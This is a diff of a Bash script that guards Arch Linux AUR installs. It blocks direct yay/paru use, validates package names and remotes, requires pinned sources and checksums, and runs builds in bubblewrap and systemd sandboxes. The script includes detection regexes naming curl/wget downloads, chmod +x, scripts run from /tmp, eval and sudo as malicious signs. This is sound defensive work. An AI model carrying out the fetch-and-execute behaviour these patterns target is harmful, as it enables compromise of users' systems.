@@ -118,7 +118,7 @@ unset -f yay paru 2>/dev/null
 #   aurverify package     recursively verify one AUR package and its AUR dependencies
 #   aurup package         verify, prepare caches, offline-build/test, then install
 #
-# Raw yay/paru sync transactions are blocked. Use aurunsafe only after manual review.
+# Every direct yay/paru invocation is blocked. Use aurunsafe only after manual review.
 
 _AUR_GUARD_ARCH_LIST_URL='https://md.archlinux.org/s/SxbqukK6IA/download'
 _AUR_GUARD_GITHUB_LIST_URL='https://raw.githubusercontent.com/lenucksi/aur-malware-check/master/package_list.txt'
@@ -140,8 +140,16 @@ _AUR_GUARD_SOURCE_DOWNLOAD_RE='(^|[;&|[:space:]])(curl|wget|fetch|aria2c)[[:spac
 _AUR_GUARD_SOURCE_EXEC_RE='chmod[[:space:]][^#]*\+x|(^|[;&|[:space:]])(bash|sh|zsh|fish|python3?|perl|ruby|node)[[:space:]][^#]*(/tmp|/dev/shm)|(^|[;&|[:space:]])(eval|source)[[:space:]]|(^|[;&|[:space:]])\.[[:space:]]+[^[:space:]]|(^|[;&|[:space:]])(sudo|pkexec)[[:space:]]'
 _AUR_GUARD_SOURCE_SCAN_MAX_BYTES=$((8 * 1024 * 1024))
 _AUR_GUARD_SOURCE_SCAN_MAX_FILES=15000
-_AUR_GUARD_SANDBOX_TIMEOUT_SECONDS=900
-_AUR_GUARD_SANDBOX_KILL_AFTER_SECONDS=10
+_AUR_GUARD_SANDBOX_TIMEOUT_SECONDS=7200
+_AUR_GUARD_SANDBOX_KILL_AFTER_SECONDS=15
+_AUR_GUARD_SANDBOX_MEMORY_MAX='75%'
+_AUR_GUARD_SANDBOX_MEMORY_SWAP_MAX='25%'
+_AUR_GUARD_SANDBOX_TASKS_MAX=1024
+_AUR_GUARD_SANDBOX_FILE_SIZE_MAX=$((16 * 1024 * 1024 * 1024))
+_AUR_GUARD_ARTIFACT_MAX_BYTES=$((8 * 1024 * 1024 * 1024))
+_AUR_GUARD_ARTIFACT_MAX_FILES=200000
+_AUR_GUARD_TREE_MAX_BYTES=$((32 * 1024 * 1024 * 1024))
+_AUR_GUARD_NETWORK_TEST_URL='https://aur.archlinux.org/'
 
 _aur_guard_pass() {
   local msg="$1"
@@ -163,15 +171,50 @@ _aur_guard_refuse_install() {
 
   printf '\n\033[1;31mAwtarchy refused to install: %s\033[0m\n' "$pkg" >&2
   printf 'Reason: %s\n' "$reason" >&2
-  printf 'No package was installed.\n' >&2
+
+  if [[ ${_AUR_GUARD_INSTALL_STARTED:-0} == 1 ]]; then
+    printf 'The final pacman transaction started. Inspect /var/log/pacman.log before assuming the host is unchanged.\n' >&2
+  else
+    printf 'No package was installed.\n' >&2
+  fi
 }
 
 _aur_guard_pick_helper() {
-  if type -P yay >/dev/null 2>&1; then
-    printf 'yay\n'
-  elif type -P paru >/dev/null 2>&1; then
-    printf 'paru\n'
-  else
+  local helper
+
+  helper=$(type -P yay 2>/dev/null) && {
+    printf '%s\n' "$helper"
+    return 0
+  }
+  helper=$(type -P paru 2>/dev/null) && {
+    printf '%s\n' "$helper"
+    return 0
+  }
+  return 1
+}
+
+_aur_guard_validate_package_name() {
+  local pkg="$1"
+
+  if [[ ! "$pkg" =~ ^[[:alnum:]@_+][[:alnum:]@._+-]*$ ]]; then
+    _aur_guard_fail "invalid package name: $pkg"
+    return 1
+  fi
+}
+
+_aur_guard_urlencode() {
+  local value="$1"
+  command jq -nr --arg value "$value" '$value | @uri'
+}
+
+_aur_guard_validate_official_remote() {
+  local pkgbase="$1"
+  local remote="$2"
+  local expected="https://aur.archlinux.org/${pkgbase}.git"
+
+  if [[ "$remote" != "$expected" ]]; then
+    _aur_guard_fail "$pkgbase was fetched from an unexpected Git remote: $remote"
+    printf 'Expected: %s\n' "$expected" >&2
     return 1
   fi
 }
@@ -179,18 +222,50 @@ _aur_guard_pick_helper() {
 _aur_guard_download() {
   local url="$1"
   local output="$2"
+  local output_dir output_name
+  local -a command_line
+
+  output_dir=$(dirname -- "$output") || return 1
+  output_name=$(basename -- "$output") || return 1
+  mkdir -p "$output_dir" || return 1
+
+  case "$output_name" in
+    ''|.|..|*/*)
+      _aur_guard_fail "invalid download output path: $output"
+      return 1
+      ;;
+  esac
 
   if type -P curl >/dev/null 2>&1; then
-    command curl --fail --silent --show-error --location \
-      --proto '=https' --tlsv1.2 \
-      --connect-timeout 10 --max-time 45 --retry 2 \
-      --output "$output" "$url"
+    command_line=(
+      /usr/bin/curl
+      --fail
+      --silent
+      --show-error
+      --location
+      --proto '=https'
+      --tlsv1.2
+      --connect-timeout 10
+      --max-time 45
+      --retry 2
+      --output "/work/$output_name"
+      "$url"
+    )
   elif type -P wget >/dev/null 2>&1; then
-    command wget --https-only --timeout=45 --tries=3 \
-      --quiet --output-document="$output" "$url"
+    command_line=(
+      /usr/bin/wget
+      --https-only
+      --timeout=45
+      --tries=3
+      --quiet
+      --output-document="/work/$output_name"
+      "$url"
+    )
   else
     return 127
   fi
+
+  _aur_guard_sandbox_exec "$output_dir" allow writable / "${command_line[@]}"
 }
 
 _aur_guard_cache_is_fresh() {
@@ -478,7 +553,7 @@ _aur_guard_block_message() {
   local helper="$1"
 
   printf '\033[1;31mAUR Guard blocked this %s transaction.\033[0m\n\n' "$helper"
-  printf 'Raw AUR installs and mass updates bypass Awtarchy recursive verification.\n\n'
+  printf 'Every direct helper operation is blocked by policy because it bypasses Awtarchy verification.\n\n'
   printf 'Use:\n'
   printf '  sysupdate             update enabled pacman repo packages\n'
   printf '  aurcheck              show AUR updates, emergency blocks, and historical warnings\n'
@@ -493,6 +568,39 @@ _aur_guard_dependency_name() {
   dep="${dep%%[<>=]*}"
   dep="${dep//[[:space:]]/}"
   printf '%s\n' "$dep"
+}
+
+_aur_guard_repo_package_satisfies() {
+  local dep_spec="$1"
+  local dep_name="$2"
+  local candidate_version constraint operator required comparison
+
+  candidate_version=$(command pacman -Si "$dep_name" 2>/dev/null \
+    | awk -F ': ' '/^Version/ {print $2; exit}')
+  [[ -n "$candidate_version" ]] || return 1
+
+  constraint="${dep_spec#"$dep_name"}"
+  [[ -n "$constraint" ]] || return 0
+
+  case "$constraint" in
+    '>='*) operator='>='; required="${constraint#>=}" ;;
+    '<='*) operator='<='; required="${constraint#<=}" ;;
+    '>'*)  operator='>';  required="${constraint#>}" ;;
+    '<'*)  operator='<';  required="${constraint#<}" ;;
+    '='*)  operator='=';  required="${constraint#=}" ;;
+    *) return 1 ;;
+  esac
+
+  [[ -n "$required" ]] || return 1
+  comparison=$(vercmp "$candidate_version" "$required") || return 1
+
+  case "$operator" in
+    '>=') (( comparison >= 0 )) ;;
+    '<=') (( comparison <= 0 )) ;;
+    '>')  (( comparison > 0 )) ;;
+    '<')  (( comparison < 0 )) ;;
+    '=')  (( comparison == 0 )) ;;
+  esac
 }
 
 _aur_guard_find_installed_provider() {
@@ -533,11 +641,14 @@ _aur_guard_find_installed_provider() {
 
 _aur_guard_rpc_exact_package() {
   local pkg="$1"
-  local json
+  local json encoded
 
+  _aur_guard_validate_package_name "$pkg" || return 1
+  encoded=$(_aur_guard_urlencode "$pkg") || return 1
   json=$(mktemp) || return 1
+
   if ! _aur_guard_download \
-      "https://aur.archlinux.org/rpc/v5/info?arg%5B%5D=${pkg}" \
+      "https://aur.archlinux.org/rpc/v5/info?arg%5B%5D=${encoded}" \
       "$json"; then
     rm -f "$json"
     return 1
@@ -556,13 +667,15 @@ _aur_guard_rpc_exact_package() {
 
 _aur_guard_rpc_providers() {
   local dep_name="$1"
-  local json
+  local json encoded
 
   type -P jq >/dev/null 2>&1 || return 2
-
+  _aur_guard_validate_package_name "$dep_name" || return 1
+  encoded=$(_aur_guard_urlencode "$dep_name") || return 1
   json=$(mktemp) || return 1
+
   if ! _aur_guard_download \
-      "https://aur.archlinux.org/rpc/v5/search/${dep_name}?by=provides" \
+      "https://aur.archlinux.org/rpc/v5/search/${encoded}?by=provides" \
       "$json"; then
     rm -f "$json"
     return 1
@@ -580,6 +693,32 @@ _aur_guard_rpc_providers() {
   ' "$json" | LC_ALL=C sort -u
 
   local status=${PIPESTATUS[0]}
+  rm -f "$json"
+  return "$status"
+}
+
+_aur_guard_rpc_package_base() {
+  local pkg="$1"
+  local json encoded
+
+  _aur_guard_validate_package_name "$pkg" || return 1
+  encoded=$(_aur_guard_urlencode "$pkg") || return 1
+  json=$(mktemp) || return 1
+
+  if ! _aur_guard_download \
+      "https://aur.archlinux.org/rpc/v5/info?arg%5B%5D=${encoded}" \
+      "$json"; then
+    rm -f "$json"
+    return 1
+  fi
+
+  command jq -r --arg pkg "$pkg" '
+    .results[]
+    | select(.Name == $pkg)
+    | (.PackageBase // .Name)
+  ' "$json"
+
+  local status=$?
   rm -f "$json"
   return "$status"
 }
@@ -605,36 +744,65 @@ _aur_guard_prepare_public_keyring() {
   rm -f "$exported_keys"
 }
 
-_aur_guard_makepkg_sandbox() {
-  local pkgdir="$1"
-  local network="$2"
-  local access="$3"
-  local username hidden
-  local -a bwrap_args
+_aur_guard_add_ro_path() {
+  local array_name="$1"
+  local source="$2"
+  local destination="$3"
+  local -n array_ref="$array_name"
 
-  shift 3
-  username="${USER:-$(id -un)}"
+  [[ -e "$source" || -L "$source" ]] || return 0
 
-  mkdir -p \
-    "$pkgdir/.awtarchy-gnupg" \
-    "$pkgdir/.awtarchy-build" \
-    "$pkgdir/.awtarchy-pkg" \
-    "$pkgdir/.awtarchy-srcpkg" \
-    "$pkgdir/.awtarchy-log" \
-    "$pkgdir/.awtarchy-cache" || return 1
+  if [[ -L "$source" ]]; then
+    array_ref+=(--symlink "$(readlink -- "$source")" "$destination")
+  elif [[ -d "$source" ]]; then
+    array_ref+=(--ro-bind "$source" "$destination")
+  else
+    array_ref+=(--ro-bind "$source" "$destination")
+  fi
+}
 
-  bwrap_args=(
-    --die-with-parent
-    --new-session
-    --unshare-all
-    --cap-drop ALL
+_aur_guard_run_sandbox_command() {
+  local network="$1"
+  shift
+  local -a systemd_args command_line
+
+  systemd_args=(
+    /usr/bin/systemd-run
+    --user
+    --wait
+    --pipe
+    --collect
+    --quiet
+    --property=Type=exec
+    --property="MemoryMax=$_AUR_GUARD_SANDBOX_MEMORY_MAX"
+    --property="MemorySwapMax=$_AUR_GUARD_SANDBOX_MEMORY_SWAP_MAX"
+    --property="TasksMax=$_AUR_GUARD_SANDBOX_TASKS_MAX"
+    --property="LimitFSIZE=$_AUR_GUARD_SANDBOX_FILE_SIZE_MAX"
+    --property=NoNewPrivileges=yes
   )
 
   case "$network" in
     allow)
-      bwrap_args+=(--share-net)
+      systemd_args+=(
+        --property='IPAddressDeny=localhost link-local multicast 0.0.0.0/8 10.0.0.0/8 100.64.0.0/10 127.0.0.0/8 169.254.0.0/16 172.16.0.0/12 192.168.0.0/16 224.0.0.0/4 240.0.0.0/4 ::1/128 ::ffff:0:0/96 fc00::/7 fe80::/10 ff00::/8'
+      )
+      command_line=(
+        /usr/bin/pasta
+        --quiet
+        --foreground
+        --config-net
+        --no-map-gw
+        --map-host-loopback none
+        --map-guest-addr none
+        --no-splice
+        --tcp-ports none
+        --udp-ports none
+        --
+        "$@"
+      )
       ;;
     deny)
+      command_line=("$@")
       ;;
     *)
       _aur_guard_fail "invalid sandbox network mode: $network"
@@ -642,31 +810,130 @@ _aur_guard_makepkg_sandbox() {
       ;;
   esac
 
-  bwrap_args+=(
-    --ro-bind / /
-    --dev /dev
+  command timeout \
+    --foreground \
+    --kill-after="${_AUR_GUARD_SANDBOX_KILL_AFTER_SECONDS}s" \
+    "${_AUR_GUARD_SANDBOX_TIMEOUT_SECONDS}s" \
+    "${systemd_args[@]}" "${command_line[@]}"
+}
+
+_aur_guard_sandbox_exec() {
+  local workdir="$1"
+  local network="$2"
+  local access="$3"
+  local rootfs="$4"
+  local username uid gid sandbox_meta resolv_file passwd_file group_file path status
+  local -a bwrap_args
+
+  shift 4
+  username="${USER:-$(id -un)}"
+  uid=$(id -u) || return 1
+  gid=$(id -g) || return 1
+  rootfs="${rootfs%/}"
+  [[ -n "$rootfs" ]] || rootfs='/'
+
+  [[ -d "$workdir" ]] || {
+    _aur_guard_fail "sandbox work directory does not exist: $workdir"
+    return 1
+  }
+  [[ -d "$rootfs/usr" ]] || {
+    _aur_guard_fail "sandbox root does not contain /usr: $rootfs"
+    return 1
+  }
+
+  sandbox_meta=$(mktemp -d "${TMPDIR:-/tmp}/awtarchy-sandbox.XXXXXX") || return 1
+  resolv_file="$sandbox_meta/resolv.conf"
+  passwd_file="$sandbox_meta/passwd"
+  group_file="$sandbox_meta/group"
+
+  printf '%s\n' \
+    'nameserver 9.9.9.9' \
+    'nameserver 149.112.112.112' \
+    'options timeout:2 attempts:2' \
+    > "$resolv_file" || {
+    rm -rf "$sandbox_meta"
+    return 1
+  }
+  printf 'root:x:0:0:root:/root:/bin/bash\n%s:x:%s:%s:AUR Guard:/tmp/awtarchy-home:/bin/bash\n' \
+    "$username" "$uid" "$gid" > "$passwd_file"
+  printf 'root:x:0:\n%s:x:%s:\n' "$username" "$gid" > "$group_file"
+  chmod 0644 "$resolv_file" "$passwd_file" "$group_file"
+
+  bwrap_args=(
+    --die-with-parent
+    --new-session
+    --unshare-user
+    --unshare-ipc
+    --unshare-pid
+    --unshare-uts
+    --unshare-cgroup-try
+    --disable-userns
+    --cap-drop ALL
+    --hostname awtarchy-aur-guard
     --proc /proc
+    --dev /dev
     --tmpfs /tmp
     --tmpfs /dev/shm
+    --tmpfs /run
+    --dir /etc
+    --dir /var
+    --dir /var/lib
+    --dir /var/cache
+    --dir /opt
+    --dir /home
+    --dir /root
+    --dir /mnt
+    --dir /media
+    --dir /srv
+    --ro-bind "$rootfs/usr" /usr
   )
 
-  for hidden in /home /root /mnt /media /run/user /run/dbus /run/media /var/tmp; do
-    [[ -d "$hidden" ]] && bwrap_args+=(--tmpfs "$hidden")
+  case "$network" in
+    allow)
+      ;;
+    deny)
+      bwrap_args+=(--unshare-net)
+      ;;
+    *)
+      rm -rf "$sandbox_meta"
+      _aur_guard_fail "invalid sandbox network mode: $network"
+      return 2
+      ;;
+  esac
+
+  for path in bin sbin lib lib64; do
+    _aur_guard_add_ro_path bwrap_args "$rootfs/$path" "/$path"
   done
 
-  bwrap_args+=(--dir /work)
+  for path in \
+      makepkg.conf makepkg.conf.d pacman.conf pacman.d paru.conf yay.conf \
+      nsswitch.conf hosts host.conf ssl ca-certificates localtime locale.conf \
+      locale.gen ld.so.cache ld.so.conf ld.so.conf.d gitconfig; do
+    _aur_guard_add_ro_path bwrap_args "$rootfs/etc/$path" "/etc/$path"
+  done
+
+  _aur_guard_add_ro_path bwrap_args "$rootfs/var/lib/pacman" /var/lib/pacman
+  _aur_guard_add_ro_path bwrap_args "$rootfs/var/cache/pacman/pkg" /var/cache/pacman/pkg
+  _aur_guard_add_ro_path bwrap_args "$rootfs/opt" /opt
+
+  bwrap_args+=(
+    --ro-bind "$resolv_file" /etc/resolv.conf
+    --ro-bind "$passwd_file" /etc/passwd
+    --ro-bind "$group_file" /etc/group
+  )
 
   case "$access" in
     readonly)
-      bwrap_args+=(--ro-bind "$pkgdir" /work)
+      bwrap_args+=(--ro-bind "$workdir" /work)
       ;;
     writable)
-      bwrap_args+=(--bind "$pkgdir" /work)
-      if [[ -d "$pkgdir/.git" ]]; then
-        bwrap_args+=(--ro-bind "$pkgdir/.git" /work/.git)
+      bwrap_args+=(--bind "$workdir" /work)
+      if [[ -d "$workdir/.git" ]]; then
+        bwrap_args+=(--ro-bind "$workdir/.git" /work/.git)
       fi
       ;;
     *)
+      rm -rf "$sandbox_meta"
       _aur_guard_fail "invalid sandbox filesystem mode: $access"
       return 2
       ;;
@@ -691,21 +958,41 @@ _aur_guard_makepkg_sandbox() {
     --setenv npm_config_cache /work/.awtarchy-cache/npm
     --setenv BUN_INSTALL_CACHE_DIR /work/.awtarchy-cache/bun
     --setenv YARN_CACHE_FOLDER /work/.awtarchy-cache/yarn
+    --setenv CCACHE_DIR /work/.awtarchy-cache/ccache
     --setenv SRCDEST /work
     --setenv BUILDDIR /work/.awtarchy-build
     --setenv PKGDEST /work/.awtarchy-pkg
     --setenv SRCPKGDEST /work/.awtarchy-srcpkg
     --setenv LOGDEST /work/.awtarchy-log
     --chdir /work
-    /usr/bin/makepkg
     "$@"
   )
 
-  command timeout \
-    --foreground \
-    --kill-after="${_AUR_GUARD_SANDBOX_KILL_AFTER_SECONDS}s" \
-    "${_AUR_GUARD_SANDBOX_TIMEOUT_SECONDS}s" \
-    bwrap "${bwrap_args[@]}"
+  _aur_guard_run_sandbox_command "$network" /usr/bin/bwrap "${bwrap_args[@]}"
+  status=$?
+  rm -rf "$sandbox_meta"
+  return "$status"
+}
+
+_aur_guard_makepkg_sandbox() {
+  local pkgdir="$1"
+  local network="$2"
+  local access="$3"
+  local rootfs="${_AUR_GUARD_SANDBOX_ROOTFS:-/}"
+
+  shift 3
+
+  mkdir -p \
+    "$pkgdir/.awtarchy-gnupg" \
+    "$pkgdir/.awtarchy-build" \
+    "$pkgdir/.awtarchy-pkg" \
+    "$pkgdir/.awtarchy-srcpkg" \
+    "$pkgdir/.awtarchy-log" \
+    "$pkgdir/.awtarchy-cache" || return 1
+
+  _aur_guard_sandbox_exec \
+    "$pkgdir" "$network" "$access" "$rootfs" \
+    /usr/bin/makepkg "$@"
 }
 
 _aur_guard_assert_tracked_files_unchanged() {
@@ -726,7 +1013,7 @@ _aur_guard_source_candidate() {
   local name="${relative##*/}"
 
   case "$name" in
-    PKGBUILD|*.sh|*.bash|*.zsh|*.fish|*.py|*.pyw|*.pl|*.rb|*.js|*.jsx|*.ts|*.tsx|*.lua|*.tcl|*.awk|*.inc|*.env|*.conf|*.cfg|*.rc|*.profile|*.mk|*.in|*.patch|*.diff|*.service|*.timer|*.socket|*.path|*.desktop|*.hook|*.install|*.cmake|CMakeLists.txt|meson.build|meson_options.txt|Makefile|GNUmakefile|makefile|configure|configure.ac|bootstrap|install|setup|build|run|package.json|package-lock.json|npm-shrinkwrap.json|pnpm-lock.yaml|yarn.lock|bun.lock|bun.lockb|pyproject.toml|requirements.txt|Cargo.toml|Cargo.lock|go.mod|go.sum|build.rs)
+    PKGBUILD|*.sh|*.bash|*.zsh|*.fish|*.py|*.pyw|*.pl|*.rb|*.js|*.jsx|*.mjs|*.cjs|*.ts|*.tsx|*.lua|*.tcl|*.awk|*.inc|*.env|*.conf|*.cfg|*.rc|*.profile|*.mk|*.in|*.patch|*.diff|*.c|*.cc|*.cpp|*.cxx|*.h|*.hh|*.hpp|*.go|*.rs|*.java|*.kt|*.kts|*.scala|*.php|*.ps1|*.service|*.timer|*.socket|*.path|*.desktop|*.hook|*.install|*.cmake|CMakeLists.txt|meson.build|meson_options.txt|Makefile|GNUmakefile|makefile|configure|configure.ac|bootstrap|install|setup|build|run|package.json|package-lock.json|npm-shrinkwrap.json|pnpm-lock.yaml|yarn.lock|bun.lock|bun.lockb|pyproject.toml|requirements.txt|Cargo.toml|Cargo.lock|go.mod|go.sum)
       return 0
       ;;
   esac
@@ -746,6 +1033,16 @@ _aur_guard_scan_source_tree() {
   local -a find_args
 
   [[ -d "$root" ]] || return 0
+
+  local tree_bytes
+  tree_bytes=$(du -sb --apparent-size "$root" 2>/dev/null | awk '{print $1}') || {
+    _aur_guard_fail "could not determine total source-tree size for $pkg"
+    return 1
+  }
+  if (( tree_bytes > _AUR_GUARD_TREE_MAX_BYTES )); then
+    _aur_guard_fail "$pkg exceeds the total source-tree size limit"
+    return 1
+  fi
 
   find_args=("$root")
   if [[ "$mode" == 'top' ]]; then
@@ -858,17 +1155,130 @@ _aur_guard_validate_source_origins() {
 
     case "$source_url" in
       git+*|hg+*|svn+*|bzr+*)
-        if [[ "$source_url" != *'#commit='* \
-            && "$source_url" != *'#tag='* ]]; then
-          _aur_guard_note_context_warning \
-            "$pkgbase:source" \
-            "moving VCS source is not pinned to a commit or tag: $source_value"
+        if [[ ! "$source_url" =~ \#commit=[0-9A-Fa-f]{40,64}([\&].*)?$ ]]; then
+          _aur_guard_fail "$pkgbase has a VCS source that is not pinned to an exact commit hash: $source_value"
+          return 1
         fi
+        ;;
+      http://*|ftp://*)
+        _aur_guard_note_context_warning \
+          "$pkgbase:source" \
+          "unencrypted source transport is protected only by its declared checksum or signature: $source_value"
         ;;
     esac
   done < <(
     awk -F ' = ' '/^[[:space:]]*source(_[[:alnum:]_]+)? = / {print $2}' "$srcinfo"
   )
+}
+
+_aur_guard_validate_skipped_integrity() {
+  local pkgbase="$1"
+  local srcinfo="$2"
+
+  if ! awk -F ' = ' '
+    function trim(value) {
+      gsub(/^[[:space:]]+|[[:space:]]+$/, "", value)
+      return value
+    }
+    function source_suffix(key, suffix) {
+      suffix = trim(key)
+      sub(/^source/, "", suffix)
+      return suffix
+    }
+    function checksum_suffix(key, suffix) {
+      suffix = trim(key)
+      sub(/^(b2|sha(224|256|384|512)|md5)sums/, "", suffix)
+      return suffix
+    }
+    function strip_alias(value) {
+      sub(/^.*::/, "", value)
+      return value
+    }
+    function local_name(value, clean, count, parts) {
+      clean = value
+      if (clean ~ /::/) {
+        sub(/::.*/, "", clean)
+        return clean
+      }
+      clean = strip_alias(clean)
+      sub(/[?#].*$/, "", clean)
+      count = split(clean, parts, "/")
+      return parts[count]
+    }
+    function is_remote(value, clean) {
+      clean = strip_alias(value)
+      return clean ~ /^([[:alpha:]][[:alnum:]+.-]*:|git\+|hg\+|svn\+|bzr\+)/
+    }
+    function exact_vcs(value, clean) {
+      clean = strip_alias(value)
+      return clean ~ /^(git|hg|svn|bzr)\+/ \
+        && clean ~ /#commit=[0-9A-Fa-f]{40,64}([&].*)?$/
+    }
+    function is_signature(name) {
+      return name ~ /\.(sig|sign|asc)$/
+    }
+    function signed_name(name) {
+      sub(/\.(sig|sign|asc)$/, "", name)
+      return name
+    }
+    /^[[:space:]]*validpgpkeys = / {
+      fingerprint = trim($2)
+      if (fingerprint !~ /^[0-9A-Fa-f]{40}$/           && fingerprint !~ /^[0-9A-Fa-f]{64}$/) {
+        printf "Invalid validpgpkeys fingerprint: %s\n", fingerprint > "/dev/stderr"
+        bad = 1
+      }
+      valid_pgp = 1
+      next
+    }
+    /^[[:space:]]*source(_[[:alnum:]_]+)? = / {
+      suffix = source_suffix($1)
+      i = ++source_count[suffix]
+      source[suffix SUBSEP i] = $2
+      next
+    }
+    /^[[:space:]]*(b2|sha256|sha384|sha512)sums(_[[:alnum:]_]+)? = / {
+      suffix = checksum_suffix($1)
+      i = ++checksum_count[$1]
+      if ($2 != "SKIP") strong[suffix SUBSEP i] = 1
+      next
+    }
+    END {
+      for (suffix in source_count) {
+        for (i = 1; i <= source_count[suffix]; i++) {
+          key = suffix SUBSEP i
+          name = local_name(source[key])
+          source_name[suffix SUBSEP name] = 1
+          if (strong[key]) strong_name[suffix SUBSEP name] = 1
+          if (is_signature(name)) {
+            signature_for[suffix SUBSEP signed_name(name)] = 1
+          }
+        }
+      }
+
+      for (suffix in source_count) {
+        for (i = 1; i <= source_count[suffix]; i++) {
+          key = suffix SUBSEP i
+          value = source[key]
+          name = local_name(value)
+
+          if (!is_remote(value) || exact_vcs(value) || strong[key]) continue
+
+          if (valid_pgp && is_signature(name) \
+              && source_name[suffix SUBSEP signed_name(name)]) continue
+
+          if (valid_pgp && signature_for[suffix SUBSEP name]) continue
+
+          printf "Source lacks a strong checksum, exact VCS commit, or matching pinned PGP signature: %s\n", \
+            value > "/dev/stderr"
+          bad = 1
+        }
+      }
+      exit bad
+    }
+  ' "$srcinfo"; then
+    _aur_guard_fail "$pkgbase contains a remote source without strong immutable integrity verification"
+    return 1
+  fi
 }
 
 _aur_guard_validate_dependency_evidence() {
@@ -993,6 +1403,7 @@ _aur_guard_record_required_package() {
 _aur_guard_record_repo_dependency() {
   local pkg="$1"
   [[ -n "$pkg" ]] || return 0
+  _aur_guard_validate_package_name "$pkg" || return 1
   grep -Fqx -- "$pkg" "$_AUR_GUARD_REPO_DEPS" 2>/dev/null \
     || printf '%s\n' "$pkg" >> "$_AUR_GUARD_REPO_DEPS"
 }
@@ -1004,7 +1415,7 @@ _aur_guard_scan_package_files() {
 
   printf 'AUR Verify: scanning %s for known malicious patterns.\n' "$pkg"
 
-  if grep -RInE \
+  if grep -rInE \
       --exclude-dir='.git' \
       --binary-files=without-match \
       "$_AUR_GUARD_HARD_BLOCK_RE" \
@@ -1033,7 +1444,7 @@ _aur_guard_scan_package_files() {
     return 1
   fi
 
-  grep -RInE \
+  grep -rInE \
     --exclude-dir='.git' \
     --include='PKGBUILD' \
     --include='*.install' \
@@ -1074,32 +1485,82 @@ _aur_guard_verify_srcinfo() {
   mv -f "$generated" "$pkgdir/.SRCINFO.verified"
 }
 
-_aur_guard_fetch_package() {
-  local pkg="$1"
-  local fetch_parent="$2"
-  local helper="$3"
-  local pkgdir
+_aur_guard_validate_checkout_tree() {
+  local pkgbase="$1"
+  local pkgdir="$2"
+  local entry count tree_bytes
 
-  mkdir -p "$fetch_parent" || return 1
+  [[ -f "$pkgdir/PKGBUILD" && ! -L "$pkgdir/PKGBUILD" ]] || {
+    _aur_guard_fail "$pkgbase does not contain a regular PKGBUILD"
+    return 1
+  }
+  [[ -f "$pkgdir/.SRCINFO" && ! -L "$pkgdir/.SRCINFO" ]] || {
+    _aur_guard_fail "$pkgbase does not contain a regular committed .SRCINFO"
+    return 1
+  }
 
-  if ! (cd "$fetch_parent" && command "$helper" -G "$pkg" >/dev/null 2>&1); then
+  entry=$(find -P "$pkgdir" -path "$pkgdir/.git" -prune -o \
+    \( -type l -o ! -type d ! -type f \) -print -quit 2>/dev/null)
+  if [[ -n "$entry" ]]; then
+    _aur_guard_fail "$pkgbase contains a symbolic link or special file in its AUR checkout: ${entry#"$pkgdir"/}"
     return 1
   fi
 
-  pkgdir=$(find "$fetch_parent" -mindepth 1 -maxdepth 1 -type d -print -quit)
-  [[ -n "$pkgdir" && -f "$pkgdir/PKGBUILD" ]] || return 1
+  count=$(find -P "$pkgdir" -path "$pkgdir/.git" -prune -o -type f -print \
+    | wc -l) || return 1
+  if (( count > _AUR_GUARD_SOURCE_SCAN_MAX_FILES )); then
+    _aur_guard_fail "$pkgbase AUR checkout contains too many files"
+    return 1
+  fi
+
+  tree_bytes=$(du -sb --apparent-size --exclude=.git "$pkgdir" 2>/dev/null \
+    | awk '{print $1}') || return 1
+  if (( tree_bytes > _AUR_GUARD_TREE_MAX_BYTES )); then
+    _aur_guard_fail "$pkgbase AUR checkout exceeds the size limit"
+    return 1
+  fi
+}
+
+_aur_guard_fetch_package() {
+  local pkg="$1"
+  local fetch_parent="$2"
+  local pkgbase remote pkgdir
+
+  _aur_guard_validate_package_name "$pkg" || return 1
+  pkgbase=$(_aur_guard_rpc_package_base "$pkg") || return 1
+  [[ -n "$pkgbase" ]] || return 1
+  _aur_guard_validate_package_name "$pkgbase" || return 1
+
+  mkdir -p "$fetch_parent" || return 1
+  pkgdir="$fetch_parent/$pkgbase"
+  rm -rf "$pkgdir"
+
+  if ! _aur_guard_sandbox_exec \
+      "$fetch_parent" allow writable / \
+      /usr/bin/git clone \
+        --quiet \
+        --no-hardlinks \
+        -- "https://aur.archlinux.org/${pkgbase}.git" "/work/$pkgbase"; then
+    return 1
+  fi
+
+  [[ -d "$pkgdir/.git" ]] || return 1
+  _aur_guard_validate_checkout_tree "$pkgbase" "$pkgdir" || return 1
+  remote=$(command git -C "$pkgdir" remote get-url origin 2>/dev/null) || return 1
+  _aur_guard_validate_official_remote "$pkgbase" "$remote" || return 1
+
   printf '%s\n' "$pkgdir"
 }
 
 _aur_guard_verify_package_recursive() {
   local pkg="$1"
   local parent="$2"
-  local helper="$_AUR_GUARD_HELPER"
-  local fetch_parent pkgdir pkgbase commit remote srcinfo
+  local fetch_parent pkgdir pkgbase fetched_pkgbase commit remote srcinfo
   local split_pkg dep_spec dep_name provider exact_aur_pkg
   local -a providers=()
 
   [[ -n "$pkg" ]] || return 1
+  _aur_guard_validate_package_name "$pkg" || return 1
 
   if [[ ${_AUR_GUARD_REQUEST_STATE[$pkg]+set} ]]; then
     case "${_AUR_GUARD_REQUEST_STATE[$pkg]}" in
@@ -1120,11 +1581,12 @@ _aur_guard_verify_package_recursive() {
   fetch_parent="$_AUR_GUARD_WORK_DIR/fetch/${pkg//[^a-zA-Z0-9._+-]/_}"
   rm -rf "$fetch_parent"
 
-  pkgdir=$(_aur_guard_fetch_package "$pkg" "$fetch_parent" "$helper") || {
+  pkgdir=$(_aur_guard_fetch_package "$pkg" "$fetch_parent") || {
     _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
     _aur_guard_fail "failed to fetch AUR package $pkg"
     return 1
   }
+  fetched_pkgbase="${pkgdir##*/}"
 
   _aur_guard_scan_package_files "$pkg" "$pkgdir" || {
     _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
@@ -1139,6 +1601,15 @@ _aur_guard_verify_package_recursive() {
   srcinfo="$pkgdir/.SRCINFO.verified"
   pkgbase=$(awk -F ' = ' '/^[[:space:]]*pkgbase = / {print $2; exit}' "$srcinfo")
   [[ -n "$pkgbase" ]] || pkgbase="$pkg"
+  _aur_guard_validate_package_name "$pkgbase" || {
+    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
+    return 1
+  }
+  if [[ "$pkgbase" != "$fetched_pkgbase" ]]; then
+    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
+    _aur_guard_fail "$pkg committed .SRCINFO reports package base $pkgbase but the official AUR RPC returned $fetched_pkgbase"
+    return 1
+  fi
   _aur_guard_record_required_package "$pkgbase" "$pkg"
 
   if [[ ${_AUR_GUARD_BASE_STATE[$pkgbase]+set} ]]; then
